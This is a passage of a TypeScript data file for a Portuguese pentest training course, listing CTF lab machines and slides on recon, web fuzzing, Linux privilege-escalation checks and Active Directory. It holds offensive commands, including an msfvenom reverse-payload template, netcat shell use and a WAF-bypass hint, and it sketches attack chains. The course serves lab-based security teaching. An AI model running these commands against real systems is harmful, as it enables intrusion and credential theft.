export interface TerminalLine {
  type: 'prompt' | 'output' | 'error' | 'comment';
  text: string;
}

export interface SlideContent {
  theory?: string[];
  table?: { headers: string[]; rows: string[][] };
  commands?: string[];
  terminal?: TerminalLine[];
  tips?: string[];
  list?: string[];
  checklist?: string[];
  note?: string;
}

export interface Slide {
  id: string;
  title: string;
  day: number;
  topic: string;
  type: 'theory' | 'commands' | 'terminal' | 'tips' | 'table' | 'lab' | 'checklist' | 'cheatsheet';
  content: SlideContent;
}

export interface Lab {
  id: string;
  name: string;
  day: number;
  os: 'Linux' | 'Windows';
  difficulty: 'Easy' | 'Medium' | 'Hard' | 'Insane';
  timed: boolean;
  timerMinutes?: number;
  topics: string[];
  description: string;
  hint: string;
}

export const labs: Lab[] = [
  // Day 1 - Easy
  {
    id: 'cap', name: 'Cap', day: 1, os: 'Linux', difficulty: 'Easy', timed: false,
    topics: ['FTP', 'Wireshark', 'PCAP', 'Linux capabilities'],
    description: 'Uma aplicação web captura tráfego de rede e serve arquivos PCAP. Analise o tráfego e explore uma capability mal configurada no Python.',
    hint: 'Observe a URL da aplicação web — o número no caminho identifica qual captura você está vendo. Tente outros valores.'
  },
  {
    id: 'nibbles', name: 'Nibbles', day: 1, os: 'Linux', difficulty: 'Easy', timed: false,
    topics: ['HTTP enumeration', 'File upload', 'Sudo abuse'],
    description: 'Um blog CMS com painel administrativo acessível em caminho não-óbvio. Credenciais simples, upload de arquivo para execução remota.',
    hint: 'Leia o código-fonte HTML da página inicial com atenção. Há um comentário relevante.'
  },
  {
    id: 'jerry', name: 'Jerry', day: 1, os: 'Windows', difficulty: 'Easy', timed: false,
    topics: ['Apache Tomcat', 'Default credentials', 'WAR deployment'],
    description: 'Apache Tomcat com Manager acessível. Credenciais padrão permitem upload de arquivo WAR malicioso para execução de código.',
    hint: 'Consulte listas de credenciais padrão do Apache Tomcat. O Manager está em /manager/html.'
  },
  {
    id: 'devel', name: 'Devel', day: 1, os: 'Windows', difficulty: 'Easy', timed: true, timerMinutes: 45,
    topics: ['FTP anônimo', 'IIS', 'Webshell ASPX', 'Kernel exploit'],
    description: 'FTP com acesso anônimo e permissão de escrita na raiz do IIS. Upload de webshell ASPX para RCE. Escalada via exploit de kernel.',
    hint: 'FTP anônimo permite escrita. Qual extensão o IIS executa por padrão?'
  },
  {
    id: 'blue', name: 'Blue', day: 1, os: 'Windows', difficulty: 'Easy', timed: true, timerMinutes: 45,
    topics: ['SMBv1', 'EternalBlue', 'MS17-010'],
    description: 'Windows 7 vulnerável ao EternalBlue (MS17-010). Exploit clássico via SMBv1 que resulta em acesso como SYSTEM.',
    hint: 'Execute scripts de vulnerabilidade do Nmap. O que os resultados revelam sobre a versão do SMB?'
  },
  {
    id: 'lame', name: 'Lame', day: 1, os: 'Linux', difficulty: 'Easy', timed: true, timerMinutes: 45,
    topics: ['Samba', 'CVE-2007-2447', 'Command injection'],
    description: 'Samba 3.0.20 vulnerável a injeção de comando no campo de username. Uma das máquinas mais antigas do HTB.',
    hint: 'Pesquise o CVE da versão do Samba encontrada no Nmap. O exploit envolve o campo de username.'
  },
  // Day 2 - Medium
  {
    id: 'forest', name: 'Forest', day: 2, os: 'Windows', difficulty: 'Medium', timed: false,
    topics: ['LDAP', 'AS-REP Roasting', 'BloodHound', 'DCSync'],
    description: 'DC do AD com enumeração via LDAP/RPC sem credenciais. AS-REP Roasting, BloodHound para mapear caminho até Domain Admin.',
    hint: 'Enumere usuários do domínio via RPC sem autenticação. Verifique quais não requerem pré-autenticação Kerberos.'
  },
  {
    id: 'sauna', name: 'Sauna', day: 2, os: 'Windows', difficulty: 'Medium', timed: false,
    topics: ['LDAP', 'AS-REP Roasting', 'AutoLogon', 'DCSync'],
    description: 'LDAP anônimo revela usuários. AS-REP Roasting para acesso inicial. Credenciais AutoLogon no registro para movimento lateral.',
    hint: 'Os nomes no site web podem sugerir usernames do domínio. Tente formatos comuns (nome.sobrenome, etc).'
  },
  {
    id: 'active', name: 'Active', day: 2, os: 'Windows', difficulty: 'Medium', timed: false,
    topics: ['SMB null session', 'GPP password', 'Kerberoasting'],
    description: 'SMB anônimo expõe share de replicação com Groups.xml contendo senha GPP criptografada. Kerberoasting para admin.',
    hint: 'Acesse o compartilhamento SMB anonimamente. Procure arquivos XML nas políticas de grupo.'
  },
  {
    id: 'monteverde', name: 'Monteverde', day: 2, os: 'Windows', difficulty: 'Medium', timed: true, timerMinutes: 60,
    topics: ['RPC enumeration', 'Password spray', 'Azure AD Connect'],
    description: 'Enumeração RPC expõe usuários. Spray de senha simples. Banco de dados Azure AD Connect contém credenciais em texto claro.',
    hint: 'Após listar usuários via RPC, tente senhas iguais ao próprio username para cada conta.'
  },
  {
    id: 'cascade', name: 'Cascade', day: 2, os: 'Windows', difficulty: 'Medium', timed: true, timerMinutes: 60,
    topics: ['LDAP attributes', 'AD Recycle Bin', 'VNC decrypt'],
    description: 'Atributos LDAP customizados contêm senha legada. AD Recycle Bin guarda objeto deletado com dados. Senha VNC para escalar.',
    hint: 'Enumere todos os atributos LDAP — não apenas os padrão. Preste atenção em campos incomuns.'
  },
  {
    id: 'cronos', name: 'Cronos', day: 2, os: 'Linux', difficulty: 'Medium', timed: true, timerMinutes: 60,
    topics: ['DNS zone transfer', 'SQLi auth bypass', 'Cron job privesc'],
    description: 'Transferência de zona DNS revela subdomínio administrativo. SQLi bypassa login. Cron job com escrita burca root.',
    hint: 'Tente uma transferência de zona DNS. Há subdomínios não visíveis no scan de porta inicial.'
  },
  // Day 3 - Hard
  {
    id: 'blackfield', name: 'Blackfield', day: 3, os: 'Windows', difficulty: 'Hard', timed: false,
    topics: ['AS-REP Roasting', 'BloodHound', 'ForceChangePassword', 'SeBackupPrivilege', 'NTDS'],
    description: 'SMB null session revela usernames. AS-REP Roasting. BloodHound mostra ForceChangePassword. SeBackupPrivilege para extrair NTDS.',
    hint: 'O share de perfis SMB contém diretórios com nomes de usuários do domínio.'
  },
  {
    id: 'sizzle', name: 'Sizzle', day: 3, os: 'Windows', difficulty: 'Hard', timed: false,
    topics: ['SCF attack', 'ADCS', 'Kerberoasting', 'DCSync'],
    description: 'Arquivo SCF em share SMB gravável captura hash NTLMv2. AD Certificate Services para autenticação. Kerberoasting até DCSync.',
    hint: 'Identifique shares SMB onde você pode escrever arquivos. Um arquivo especialmente criado pode capturar credenciais.'
  },
  {
    id: 'querier', name: 'Querier', day: 3, os: 'Windows', difficulty: 'Hard', timed: false,
    topics: ['MSSQL', 'xp_cmdshell', 'Responder', 'Silver Ticket'],
    description: 'Arquivo Excel no SMB tem string de conexão MSSQL. Habilitar xp_cmdshell. NTLMv2 via Responder para escalada.',
    hint: 'Baixe todos os arquivos dos shares SMB. Arquivos Office podem conter dados de conexão.'
  },
  {
    id: 'mantis', name: 'Mantis', day: 3, os: 'Windows', difficulty: 'Hard', timed: true, timerMinutes: 90,
    topics: ['Web app', '.NET decryption', 'MSSQL', 'Kerberos Bronze Bit'],
    description: 'Aplicação web .NET em porta 8080. Decriptar credenciais do banco de dados da configuração da app. MSSQL para credenciais do domínio.',
    hint: 'A aplicação web esconde dados codificados. Decodifique a string de conexão para obter credenciais.'
  },
  {
    id: 'reel2', name: 'Reel2', day: 3, os: 'Windows', difficulty: 'Hard', timed: true, timerMinutes: 90,
    topics: ['OWA phishing', 'JEA bypass', 'Sticky Notes'],
    description: 'Phishing via OWA com arquivo RTF captura NTLMv2. JEA constrained PowerShell com bypass. Sticky Notes contêm credenciais.',
    hint: 'Identifique o serviço de webmail acessível. Um arquivo de phishing pode capturar hashes automaticamente.'
  },
  {
    id: 'multimaster', name: 'Multimaster', day: 3, os: 'Windows', difficulty: 'Insane', timed: true, timerMinutes: 90,
    topics: ['SQLi WAF bypass', 'Sysmon', 'VS Code tunnel', 'Exchange abuse'],
    description: 'SQLi com bypass de WAF usando Unicode. Pivotar via Sysmon. Movimento lateral via túnel VS Code. Abuso de Exchange para privesc.',
    hint: 'A API web tem proteção WAF. Tente codificação Unicode para contornar os filtros de SQLi.'
  },
  // Day 4 - Extra
  {
    id: 'cap-speed', name: 'Cap (Speed Run)', day: 4, os: 'Linux', difficulty: 'Easy', timed: true, timerMinutes: 30,
    topics: ['Revisão rápida'],
    description: 'Refaça Cap com o tempo como pressão. Você já conhece o caminho — execute com eficiência.',
    hint: 'Sem dica. Você já sabe o que fazer.'
  },
  {
    id: 'nibbles-speed', name: 'Nibbles (Speed Run)', day: 4, os: 'Linux', difficulty: 'Easy', timed: true, timerMinutes: 30,
    topics: ['Revisão rápida'],
    description: 'Refaça Nibbles com cronômetro. Objetivo: root em menos de 30 minutos.',
    hint: 'Sem dica. Execute o fluxo completo do zero.'
  },
  {
    id: 'forest-speed', name: 'Forest (Speed Run)', day: 4, os: 'Windows', difficulty: 'Medium', timed: true, timerMinutes: 45,
    topics: ['Revisão AD'],
    description: 'Refaça Forest com cronômetro. Teste se você internalizou o fluxo de AS-REP Roasting → BloodHound → DCSync.',
    hint: 'Sem dica. Documente cada etapa como em um relatório real.'
  },
  {
    id: 'sauna-speed', name: 'Sauna (Speed Run)', day: 4, os: 'Windows', difficulty: 'Medium', timed: true, timerMinutes: 45,
    topics: ['Revisão AD'],
    description: 'Refaça Sauna com pressão de tempo. Foque em ser sistemático.',
    hint: 'Sem dica.'
  },
  {
    id: 'active-speed', name: 'Active (Speed Run)', day: 4, os: 'Windows', difficulty: 'Medium', timed: true, timerMinutes: 45,
    topics: ['Revisão AD'],
    description: 'GPP + Kerberoasting em menos de 45 minutos. Você consegue.',
    hint: 'Sem dica.'
  },
  {
    id: 'blackfield-speed', name: 'Blackfield (Speed Run)', day: 4, os: 'Windows', difficulty: 'Hard', timed: true, timerMinutes: 75,
    topics: ['Revisão avançada'],
    description: 'Hard em 75 minutos. Teste total de habilidade: AS-REP → BloodHound → SeBackupPrivilege → NTDS.',
    hint: 'Sem dica. Este é o teste.'
  },
  {
    id: 'querier-speed', name: 'Querier (Speed Run)', day: 4, os: 'Windows', difficulty: 'Hard', timed: true, timerMinutes: 75,
    topics: ['Revisão avançada'],
    description: 'MSSQL completo em 75 minutos. Demonstre domínio da cadeia de ataque.',
    hint: 'Sem dica.'
  },
  {
    id: 'multimaster-full', name: 'Multimaster (Desafio)', day: 4, os: 'Windows', difficulty: 'Insane', timed: true, timerMinutes: 90,
    topics: ['Desafio final'],
    description: 'Tentativa completa da cadeia Insane. Não é esperado completar — é esperado aprender.',
    hint: 'Unicode bypass: tente \u0027 em vez de aspas literais no campo da API.'
  },
];

const intensiveSlides: Slide[] = [
  // ==================== TRILHA INTENSIVA - DIA 1 ====================
  {
    id: 'd1-intensive-10h-plan', title: 'Dia 1 Intensivo — Roteiro de 10h30', day: 1, topic: 'Ferramentas',
    type: 'table',
    content: {
      theory: [
        'Este dia não é uma lista de comandos. O objetivo é formar o raciocínio inicial: olhar para um alvo autorizado, descobrir sua superfície, escolher ferramentas com intenção e registrar evidências.',
        'Ao final do Dia 1 você deve conseguir explicar por que rodou cada comando, o que esperava encontrar, como leu a saída e qual decisão tomou depois.',
      ],
      table: {
        headers: ['Tempo', 'Bloco', 'O que aprender', 'Entrega obrigatória'],
        rows: [
          ['0:00-0:40', 'Escopo e método', 'Definir alvo autorizado, criar pasta do caso, entender ciclo reconhecer -> enumerar -> validar -> explorar em laboratório.', 'Notas com IP, domínio, objetivo e limites do lab.'],
          ['0:40-2:00', 'TCP/IP, portas e DNS', 'Camadas, TCP vs UDP, handshake, CIDR, portas comuns, DNS direto e reverso, zone transfer.', 'Mapa de portas e serviços com hipóteses iniciais.'],
          ['2:00-3:20', 'Nmap profundo', 'Host discovery, scan de portas, detecção de versão, scripts NSE, UDP, leitura de estados e salvamento de evidência.', 'scan.txt, allports.txt e uma interpretação escrita.'],
          ['3:20-4:30', 'HTTP manual', 'Headers, cookies, métodos, status code, redirects, virtual hosts, enumeração de diretórios e fuzzing.', 'Lista de rotas, tecnologias, parâmetros e possíveis vetores.'],
          ['4:30-5:30', 'Linux essencial', 'Filesystem, permissões, SUID, capabilities, processos, logs e comandos de orientação pós-shell.', 'Checklist de enumeração local preenchida.'],
          ['5:30-6:30', 'FTP, SMB e SSH', 'Acesso anônimo, listagem de shares, download recursivo, credenciais reaproveitadas e chaves SSH.', 'Tabela serviço -> evidência -> próximo teste.'],
          ['6:30-7:30', 'Wireshark e PCAP', 'Filtros, Follow TCP Stream, extração de objetos, credenciais em texto claro e reconstrução de sessão.', 'Um mini-relatório de PCAP com protocolo, credencial e prova.'],
          ['7:30-10:30', 'Labs Easy guiados', 'Aplicar método em Cap, Nibbles, Jerry, Devel, Blue e Lame com documentação em tempo real.', 'Uma write-up curta por máquina, mesmo que incompleta.'],
        ],
      },
      tips: [
        'Se um bloco acabar rápido, refaça o mesmo exercício explicando em voz alta cada decisão. A meta é domínio, não velocidade vazia.',
        'Não avance para exploração enquanto não souber quais serviços existem e qual evidência sustenta sua hipótese.',
      ]
    }
  },
  {
    id: 'd1-methodology-before-tools', title: 'Metodologia — Antes de Rodar Ferramentas', day: 1, topic: 'Ferramentas',
    type: 'table',
    content: {
      theory: [
        'A pergunta correta vem antes da ferramenta. Nmap, curl, gobuster, smbclient e Wireshark respondem perguntas diferentes; usar todos sem hipótese só gera ruído.',
        'Todo comando precisa produzir uma decisão: ampliar enumeração, testar uma hipótese, descartar um caminho ou coletar evidência para o relatório.',
      ],
      table: {
        headers: ['Pergunta', 'Ferramenta inicial', 'Como usar', 'Como ler', 'Próximo passo'],
        rows: [
          ['O host está acessível?', 'ping, nmap -sn, nmap -Pn', 'Teste ICMP e, se bloqueado, force scan sem ping com -Pn.', 'Sem resposta ICMP não significa host offline.', 'Rodar scan TCP nas portas mais comuns.'],
          ['Quais portas estão abertas?', 'nmap', 'Comece com -sC -sV e depois -p- para todas as portas TCP.', 'STATE open indica serviço aceitando conexão.', 'Enumerar cada serviço aberto por protocolo.'],
          ['Qual tecnologia web roda ali?', 'curl, navegador, código-fonte', 'Leia headers, título, cookies, redirects e HTML.', 'Server, X-Powered-By e cookies sugerem stack.', 'Buscar rotas, versões e painéis.'],
          ['Existe conteúdo escondido?', 'gobuster, ffuf, feroxbuster', 'Fuzzing de diretórios, arquivos, extensões e vhosts.', '200, 301, 302, 401 e 403 merecem inspeção.', 'Abrir manualmente e testar parâmetros.'],
          ['Há arquivos expostos?', 'ftp, smbclient, enum4linux', 'Teste anonymous/null session antes de credenciais.', 'Shares legíveis e arquivos de backup são evidência forte.', 'Baixar, classificar e buscar segredos.'],
          ['O tráfego revela credenciais?', 'Wireshark, tshark', 'Filtre por ftp, http, telnet, smtp e Follow TCP Stream.', 'USER/PASS, Authorization Basic e cookies aparecem em claro.', 'Validar credenciais em serviços permitidos do lab.'],
          ['Depois do shell, como escalar?', 'sudo -l, find, getcap, cron, grep por segredos, linpeas', 'Comece pelos comandos nativos; depois rode linpeas para ampliar cobertura e confirmar hipóteses.', 'SUID incomum, NOPASSWD, capability, cron, arquivos sensíveis e achados destacados pelo linpeas são vetores.', 'Não copie output colorido: valide manualmente cada achado.'],
        ],
      },
      tips: [
        'Escreva sempre: hipótese -> comando -> resultado -> decisão. Isso transforma tentativa em aprendizado.',
        'Em CTF, velocidade vem de método repetido. Sem método, cada máquina parece um labirinto novo.',
      ]
    }
  },
  {
    id: 'd1-tool-choice-matrix', title: 'Ferramentas do Dia 1 — Quando Usar Cada Uma', day: 1, topic: 'Ferramentas',
    type: 'table',
    content: {
      table: {
        headers: ['Ferramenta', 'Use quando', 'Comando base', 'O que observar', 'Evite quando'],
        rows: [
          ['nmap', 'Precisa descobrir portas, serviços, versões e scripts seguros.', 'nmap -sC -sV -oN scan.txt <IP>', 'Porta, serviço, versão, scripts, redirects e nomes de host.', 'Você já sabe a porta exata e quer uma requisição manual simples.'],
          ['curl', 'Precisa ver headers, corpo, cookies, POST, redirects e APIs sem navegador.', 'curl -i -L http://<host>/', 'Status code, Set-Cookie, Location, Server e diferenças de resposta.', 'Precisa interagir com JavaScript complexo.'],
          ['gobuster', 'Quer enumeração simples de diretórios, arquivos, DNS ou vhosts.', 'gobuster dir -u http://<host>/ -w wordlist.txt', 'Códigos 200/301/302/401/403 e tamanho da resposta.', 'O alvo filtra por tamanho ou tem muitos falsos positivos.'],
          ['ffuf', 'Precisa fuzzing flexível em caminho, parâmetro, header ou vhost.', 'ffuf -u http://<host>/FUZZ -w wordlist.txt', 'Filtrar por status, tamanho, palavras e linhas.', 'Você ainda não entendeu a aplicação manualmente.'],
          ['smbclient', 'Precisa listar shares SMB e baixar arquivos.', 'smbclient -L //<IP> -N', 'Shares legíveis, permissões de leitura/escrita e arquivos sensíveis.', 'Quer enumeração ampla de usuários e políticas.'],
          ['enum4linux-ng', 'Precisa panorama SMB/RPC em Windows ou Samba.', 'enum4linux-ng -A <IP>', 'Usuários, grupos, shares, domínio e política de senha.', 'Tem credenciais válidas e precisa de ações específicas.'],
          ['netcat', 'Precisa testar banner, listener ou shell em laboratório.', 'nc -nv <IP> <porta>', 'Banner, resposta bruta e conectividade.', 'Protocolo exige TLS, autenticação complexa ou cliente específico.'],
          ['msfvenom', 'Lab confirmou que o serviço aceita artefato executável/deployável.', 'msfvenom -p <payload> LHOST=<IP> LPORT=<porta> -f <formato> -o arquivo', 'Gera arquivo para uso controlado no lab, como WAR ou ASPX.', 'Não use antes de provar o vetor e preparar listener.'],
          ['Wireshark', 'Precisa entender tráfego visualmente.', 'Abrir pcap -> Follow TCP Stream', 'Credenciais, arquivos, sequência TCP, DNS e HTTP.', 'Quer processar muitos PCAPs em lote. Use tshark.'],
          ['tshark', 'Precisa extrair dados de PCAP por terminal.', 'tshark -r captura.pcap -Y http', 'Campos filtrados, contagens e exportação para texto.', 'Ainda está aprendendo o fluxo visual do pacote.'],
          ['linpeas', 'Já tem shell Linux e fez enumeração manual básica.', './linpeas.sh | tee linpeas.txt', 'Destaca permissões, SUID, capabilities, cron, credenciais e configs suspeitas.', 'Nunca substitui sudo -l, find, getcap e validação manual.'],
        ]
      }
    }
  },
  {
    id: 'd1-nmap-deep-dive', title: 'Nmap — Comandos, Flags e Decisões', day: 1, topic: 'Ferramentas',
    type: 'commands',
    content: {
      theory: [
        'Nmap não é um botão mágico. Ele responde perguntas de rede. A escolha das flags depende do momento: descoberta, portas, versão, scripts, UDP ou confirmação.',
        'A saída deve ser lida em quatro camadas: host, porta, estado, serviço/versão. Só depois entram scripts e possíveis CVEs.',
      ],
      commands: [
        '# Descoberta de host em rede local ou faixa autorizada',
        'nmap -sn 10.10.10.0/24',
        '',
        '# Scan inicial equilibrado para CTF',
        'nmap -sC -sV -oN scan.txt <IP>',
        '',
        '# Quando ping/ICMP é bloqueado e o host parece offline',
        'nmap -Pn -sC -sV -oN scan.txt <IP>',
        '',
        '# Todas as portas TCP, salvando evidência',
        'nmap -p- --min-rate 5000 -oN allports.txt <IP>',
        '',
        '# Rodar scripts e versão apenas nas portas encontradas',
        'nmap -sC -sV -p 22,80,445 -oN targeted.txt <IP>',
        '',
        '# UDP é lento: comece por portas comuns',
        'sudo nmap -sU --top-ports 20 -oN udp-top.txt <IP>',
        '',
        '# Scripts NSE específicos por serviço',
        'nmap --script=http-enum -p80 <IP>',
        'nmap --script=smb-enum-shares,smb-enum-users -p445 <IP>',
        'nmap --script=ftp-anon -p21 <IP>',
        '',
        '# Saída completa para relatórios e automação',
        'nmap -sC -sV -oA scans/initial <IP>',
      ],
      table: {
        headers: ['Estado', 'Significado', 'Decisão'],
        rows: [
          ['open', 'O serviço aceitou conexão.', 'Enumerar protocolo e versão.'],
          ['closed', 'O host respondeu, mas não há serviço na porta.', 'Não explorar; use como prova de host vivo.'],
          ['filtered', 'Firewall ou filtro bloqueou resposta.', 'Tente -Pn, timing diferente ou outra técnica permitida.'],
          ['open|filtered', 'Comum em UDP, não dá para confirmar.', 'Validar manualmente com cliente do protocolo.'],
        ]
      },
      tips: [
        'Nunca copie um exploit só porque o Nmap mostrou uma versão. Primeiro confirme produto, versão, OS e contexto.',
        'Se aparecer hostname em certificado, redirect ou script, adicione ao /etc/hosts e enumere por nome.',
      ]
    }
  },
  {
    id: 'd1-web-enum-deep-dive', title: 'Web — Enumeração Manual e Fuzzing', day: 1, topic: 'Web',
    type: 'commands',
    content: {
      theory: [
        'Enumeração web começa manual: abra a página, veja código-fonte, headers, robots.txt, sitemap.xml, cookies, links e mensagens de erro. Fuzzing vem depois para ampliar cobertura.',
        'A diferença entre bom e mau fuzzing é filtro. Sem filtrar status, tamanho e palavras, você afunda em falso positivo.',
      ],
      commands: [
        '# Headers, redirects e tecnologias',
        'curl -i http://<host>/',
        'curl -I http://<host>/',
        'curl -L -i http://<host>/',
        'whatweb http://<host>/',
        '',
        '# Código-fonte e arquivos previsíveis',
        'curl -s http://<host>/ | sed -n "1,120p"',
        'curl -s http://<host>/robots.txt',
        'curl -s http://<host>/sitemap.xml',
        '',
        '# POST manual e cookies',
        'curl -i -X POST -d "user=admin&pass=admin" http://<host>/login',
        'curl -i -b "PHPSESSID=valor" http://<host>/admin',
        'curl -i -H "X-Forwarded-For: 127.0.0.1" http://<host>/admin',
        '',
        '# Diretórios e extensões',
        'gobuster dir -u http://<host>/ -w /usr/share/wordlists/dirb/common.txt',
        'gobuster dir -u http://<host>/ -w common.txt -x php,txt,bak,zip,old',
        '',
        '# Fuzzing flexível com filtros',
        'ffuf -u http://<host>/FUZZ -w common.txt -mc all -fc 404',
        'ffuf -u http://<host>/ -H "Host: FUZZ.<domain>" -w subdomains.txt -fs <tamanho_padrao>',
        'ffuf -u "http://<host>/page.php?id=FUZZ" -w numbers.txt',
      ],
      table: {
        headers: ['Sinal', 'O que pode significar', 'Ação'],
        rows: [
          ['401 Unauthorized', 'Existe recurso protegido.', 'Testar credenciais padrão e caminhos relacionados.'],
          ['403 Forbidden', 'Recurso existe, mas acesso negado.', 'Testar bypass de path, vhost, header ou extensão.'],
          ['301/302', 'Redirect revela caminho ou host.', 'Seguir com -L e adicionar hostnames no /etc/hosts.'],
          ['Cookie estranho', 'Sessão, JWT, role ou debug.', 'Decodificar, comparar antes/depois de login e testar flags.'],
          ['Erro SQL/stack trace', 'Input chegando ao backend.', 'Validar manualmente injeção em lab autorizado.'],
        ]
      }
    }
  },
  {
    id: 'd1-linux-command-foundation', title: 'Linux — Comandos que Você Precisa Entender', day: 1, topic: 'Linux',
    type: 'table',
    content: {
      theory: [
        'Memorizar comando sem entender a pergunta é frágil. Esta tabela mostra o que cada comando responde durante enumeração e pós-exploração em laboratório.',
      ],
      table: {
        headers: ['Comando', 'Pergunta respondida', 'Como interpretar', 'Erro comum'],
        rows: [
          ['whoami; id', 'Quem sou e quais grupos tenho?', 'uid, gid e grupos podem liberar arquivos ou sudo.', 'Ignorar grupos como docker, lxd, adm e backup.'],
          ['pwd; ls -la', 'Onde estou e o que existe aqui?', 'Arquivos ocultos, donos e permissões revelam pistas.', 'Ler só nomes e ignorar permissões.'],
          ['cat /etc/passwd', 'Quais usuários existem?', 'Shells reais indicam contas interativas.', 'Confundir /etc/passwd com senha em texto claro.'],
          ['sudo -l', 'Posso executar algo como outro usuário?', 'NOPASSWD e comandos permitidos são vetores diretos.', 'Não testar logo após obter shell.'],
          ['find / -perm -4000 -type f 2>/dev/null', 'Há binários SUID?', 'Binário incomum com dono root merece GTFOBins.', 'Achar que todo SUID é vulnerável.'],
          ['getcap -r / 2>/dev/null', 'Há capabilities perigosas?', 'cap_setuid, cap_dac_read_search e cap_net_raw são relevantes.', 'Esquecer capabilities porque não aparecem no ls -la.'],
          ['ps aux', 'Que processos rodam e como?', 'Usuário, comando e caminho podem revelar serviços e senhas.', 'Ignorar processo rodando como root em caminho gravável.'],
          ['ss -tulpn', 'Quais portas locais existem?', 'Serviço só em 127.0.0.1 pode exigir port forward.', 'Olhar apenas portas externas do Nmap.'],
          ['cat /etc/crontab; ls -la /etc/cron.*', 'Há tarefas agendadas?', 'Script gravável executado por root vira privesc.', 'Não esperar o cron executar para confirmar.'],
          ['grep -R "pass\\|pwd\\|secret" . 2>/dev/null', 'Há segredos em arquivos?', 'Config, backup e histórico costumam conter credenciais.', 'Rodar grep em / inteiro sem foco e travar o shell.'],
        ]
      },
      tips: [
        'Depois de qualquer credencial encontrada, teste reaproveitamento apenas nos serviços do lab e registre onde ela foi encontrada.',
      ]
    }
  },

  // ==================== TRILHA INTENSIVA - DIA 2 ====================
  {
    id: 'd2-intensive-10h-plan', title: 'Dia 2 Intensivo — Roteiro de 10h30', day: 2, topic: 'Blue Team',
    type: 'table',
    content: {
      theory: [
        'O Dia 2 conecta Blue Team, Windows e Active Directory. A meta é entender evidência e identidade: quem autenticou, onde, com qual privilégio, por qual protocolo e deixando quais rastros.',
      ],
      table: {
        headers: ['Tempo', 'Bloco', 'O que aprender', 'Entrega obrigatória'],
        rows: [
          ['0:00-1:15', 'Triagem Wazuh', 'Rule level, decoder, campos, raw log, falso positivo vs incidente.', 'Ficha de triagem de 3 alertas.'],
          ['1:15-2:30', 'Windows Event Viewer', 'Security log, tipos de logon, 4624, 4625, 4672, 4688, correlação por tempo.', 'Timeline curta de autenticação.'],
          ['2:30-3:45', 'Sysmon', 'Process creation, network connection, DNS query, registry e file create.', 'Árvore de processo suspeita explicada.'],
          ['3:45-5:15', 'Kerberos e LDAP', 'Fluxo AS-REQ, TGT, TGS, SPN, LDAP bind, DC e domínio.', 'Desenho do fluxo Kerberos com portas.'],
          ['5:15-6:45', 'Ataques AD em CTF', 'AS-REP Roasting, Kerberoasting, GPP cpassword, BloodHound e DCSync.', 'Tabela técnica -> pré-requisito -> ferramenta.'],
          ['6:45-7:45', 'Forense de disco', 'Imagem, hash, MFT, Prefetch, AmCache, LNK, Jump Lists e Registry hives.', 'Lista de artefatos por pergunta investigativa.'],
          ['7:45-10:30', 'Labs Medium', 'Forest, Sauna, Active, Monteverde, Cascade e Cronos com debrief por evidência.', 'Write-up com pelo menos uma cadeia AD completa.'],
        ]
      }
    }
  },
  {
    id: 'd2-wazuh-windows-workflow', title: 'Blue Team — Fluxo de Investigação', day: 2, topic: 'Blue Team',
    type: 'table',
    content: {
      theory: [
        'Investigar é reduzir incerteza. Você começa com alerta, volta para o log bruto, correlaciona por tempo e termina com uma afirmação apoiada por evidência.',
      ],
      table: {
        headers: ['Etapa', 'Pergunta', 'Onde olhar', 'Evidência forte'],
        rows: [
          ['Triage', 'O alerta é crítico, repetido ou isolado?', 'Wazuh level, rule id, agent, timestamp.', 'Level alto, múltiplos eventos ou host sensível.'],
          ['Contexto', 'Quem, de onde, para onde?', 'srcip, dstip, user, hostname, process.', 'Mesmo srcip gerando falhas e depois sucesso.'],
          ['Autenticação', 'Houve login bem-sucedido?', 'Windows 4624, 4625, 4648, 4672.', '4624 tipo 3 seguido de 4672 para admin.'],
          ['Execução', 'Que processo nasceu?', 'Security 4688 ou Sysmon 1.', 'cmd/powershell filho de Office, webserver ou serviço.'],
          ['Rede', 'O processo falou com IP externo?', 'Sysmon 3, firewall, PCAP.', 'Processo incomum conectando porta rara.'],
          ['Persistência', 'Algo foi criado para voltar?', 'Services, Run Keys, Scheduled Tasks, Wazuh FIM.', 'Serviço novo, tarefa agendada ou chave Run.'],
          ['Conclusão', 'Qual técnica MITRE descreve o comportamento?', 'ATT&CK + evidências coletadas.', 'T-number com logs e timestamps.'],
        ]
      },
      commands: [
        'Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4625]]" | Select-Object -First 20',
        'Get-WinEvent -LogName Security | Where-Object {$_.Id -in @(4624,4672,4648)} | Select-Object TimeCreated,Id,ProviderName',
        'Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object {$_.Id -in @(1,3,11,22)} | Select-Object -First 30',
      ]
    }
  },
  {
    id: 'd2-active-directory-deep-dive', title: 'Active Directory — Kerberos sem Decoreba', day: 2, topic: 'Active Directory',
    type: 'table',
    content: {
      theory: [
        'Kerberos é um sistema de tickets. O usuário prova quem é para o KDC, recebe um TGT, depois troca esse TGT por tickets de serviço. Ataques de roasting exploram tickets que podem ser quebrados offline.',
        'LDAP é a lista telefônica do domínio. BloodHound e várias ferramentas usam LDAP/RPC para transformar relações em caminhos de ataque.',
      ],
      table: {
        headers: ['Conceito', 'Porta', 'Função', 'Por que importa em CTF'],
        rows: [
          ['DNS do domínio', '53', 'Resolve DC e serviços via nomes.', 'Sem DNS correto, ferramentas AD falham ou demoram.'],
          ['Kerberos', '88', 'Emite TGT e TGS.', 'Base de AS-REP Roasting e Kerberoasting.'],
          ['LDAP/LDAPS', '389/636', 'Consulta usuários, grupos, SPNs e atributos.', 'Enumeração e BloodHound dependem disso.'],
          ['SMB', '445', 'Shares, SYSVOL, políticas e execução remota.', 'GPP, arquivos e movimentação lateral.'],
          ['RPC', '135 + dinâmicas', 'Enumeração de usuários e grupos.', 'rpcclient pode funcionar sem credenciais em labs.'],
          ['WinRM', '5985/5986', 'Shell remoto PowerShell.', 'Acesso inicial ou pós-credenciais com evil-winrm.'],
          ['MSSQL', '1433', 'Banco com autenticação integrada ou SQL.', 'xp_cmdshell, hashes NetNTLM e credenciais.'],
        ]
      },
      tips: [
        'Sempre configure /etc/hosts com IP, hostname e domínio do DC antes de rodar ferramentas Impacket.',
        'Se Kerberos falhar por clock skew, sincronize horário com o DC no ambiente de laboratório.',
      ]
    }
  },
  {
    id: 'd2-ad-tools-command-guide', title: 'Active Directory — Ferramentas e Comandos', day: 2, topic: 'Active Directory',
    type: 'commands',
    content: {
      theory: [
        'A ordem segura em CTF é: descobrir domínio, listar usuários, testar roast, validar credenciais, coletar BloodHound, ler caminho e só então executar ação de impacto no lab.',
      ],
      commands: [
        '# Descobrir nomes de domínio e DC pelo Nmap/SMB',
